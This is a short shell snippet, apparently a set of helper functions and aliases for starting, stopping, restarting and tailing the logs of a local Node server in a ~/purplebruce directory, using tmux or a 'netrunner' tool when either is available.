# start — works with or without netrunner
_pb_start() {
  local dir="${HOME}/purplebruce"
  [[ -d "$dir" ]] || { echo "[✘] ~/purplebruce not found"; return 1; }
  mkdir -p "${HOME}/.purplebruce"
  if command -v netrunner >/dev/null 2>&1; then
    netrunner start
  elif command -v tmux >/dev/null 2>&1; then
    tmux new-session -d -s purplebruce -x 220 -y 50 2>/dev/null || true
    tmux send-keys -t purplebruce "cd ${dir} && node server.js 2>&1 | tee ~/.purplebruce/server.log" Enter
    echo "[✔] Server started in tmux → http://127.0.0.1:3000"
    echo "    tmux attach -t purplebruce"
  else
    cd "$dir" && node server.js &
    echo "[✔] Server started → http://127.0.0.1:3000"
  fi
}
alias start='_pb_start'
alias stop='pkill -f "node server.js" 2>/dev/null && echo "[✔] Server stopped." || echo "[⚠] Not running."'
alias restart='pkill -f "node server.js" 2>/dev/null; sleep 1; _pb_start'
alias logs='tail -f ~/.purplebruce/audit.log 2>/dev/null || tail -f ~/purplebruce/server.log 2>/dev/null || echo "[⚠] No log yet — run: start"'

